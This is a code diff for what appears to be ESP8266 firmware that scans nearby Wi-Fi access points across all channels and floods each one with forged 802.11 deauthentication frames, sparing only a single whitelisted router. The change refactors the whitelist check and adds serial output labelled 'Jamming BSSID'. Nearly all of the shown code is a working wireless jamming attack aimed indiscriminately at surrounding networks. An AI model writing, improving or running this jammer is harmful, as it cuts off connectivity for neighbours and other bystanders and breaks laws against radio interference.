@@ -8,7 +8,7 @@ extern "C" {
 #define MAX_APS 100
 #define CHANNELS 14
 
-// Whitelist MAC (BSSID) of your router to avoid jamming your network
+// Whitelist only this MAC address (BSSID)
 uint8_t whitelistBSSID[6] = {0x9C, 0x53, 0x22, 0xE7, 0x2F, 0x07};
 
 struct AP {
@@ -22,9 +22,8 @@ int apCount = 0;
 int currentChannel = 1;
 
 unsigned long lastSwitch = 0;
-unsigned long switchInterval = 100; // ms channel switch time
+unsigned long switchInterval = 100; // milliseconds channel switch time
 
-// Deauth packet template
 uint8_t deauthPacket[26] = {
   0xc0, 0x00,
   0x00, 0x00,
@@ -35,24 +34,35 @@ uint8_t deauthPacket[26] = {
   0x07, 0x00
 };
 
-void ICACHE_RAM_ATTR sniffer_callback(uint8_t *buf, uint16_t len) {
-  if (len < 36) return; // minimal length for 802.11 packet
-  
-  // The BSSID is at bytes 16 to 21 in beacon/auth frame
-  uint8_t *bssid = buf + 16;
-  
-  // Check if AP already recorded
-  for (int i = 0; i < apCount; i++) {
-    if (memcmp(aps[i].bssid, bssid, 6) == 0) {
-      return;
+bool isWhitelistedBSSID(uint8_t *bssid) {
+  for (int i = 0; i < 6; i++) {
+    if (bssid[i] != whitelistBSSID[i]) {
+      return false;
     }
   }
-  
-  // Add new AP if space
+  return true;
+}
+
+void ICACHE_RAM_ATTR sniffer_callback(uint8_t *buf, uint16_t len) {
+  if (len < 36) return;
+  uint8_t *bssid = buf + 16;
+
+  for (int i = 0; i < apCount; i++) {
+    if (memcmp(aps[i].bssid, bssid, 6) == 0) return;
+  }
+
   if (apCount < MAX_APS) {
     memcpy(aps[apCount].bssid, bssid, 6);
     aps[apCount].channel = currentChannel;
     apCount++;
+  }
+}
+
+void printBSSID(uint8_t *bssid) {
+  for (int i = 0; i < 6; i++) {
+    if (bssid[i] < 0x10) Serial.print("0");
+    Serial.print(bssid[i], HEX);
+    if (i < 5) Serial.print(":");
   }
 }
 
@@ -71,25 +81,22 @@ void loop() {
 
   if (now - lastSwitch > switchInterval) {
     currentChannel++;
-    if (currentChannel > CHANNELS)
-      currentChannel = 1;
-
+    if (currentChannel > CHANNELS) currentChannel = 1;
     wifi_set_channel(currentChannel);
     lastSwitch = now;
   }
 
   for (int i = 0; i < apCount; i++) {
-    // Skip sending deauth if AP matches whitelisted BSSID
-    bool isWhitelisted = true;
-    for (int j = 0; j < 6; j++) {
-      if (aps[i].bssid[j] != whitelistBSSID[j]) {
-        isWhitelisted = false;
-        break;
-      }
+    if (isWhitelistedBSSID(aps[i].bssid)) {
+      Serial.print("Skipping whitelisted BSSID: ");
+      printBSSID(aps[i].bssid);
+      Serial.println();
+      continue;
     }
-    if (isWhitelisted) {
-      continue; // Skip jammed for this BSSID
-    }
+    Serial.print("Jamming BSSID: ");
+    printBSSID(aps[i].bssid);
+    Serial.print(" on Channel: ");
+    Serial.println(aps[i].channel);
 
     wifi_set_channel(aps[i].channel);
     memcpy(&deauthPacket[10], aps[i].bssid, 6);
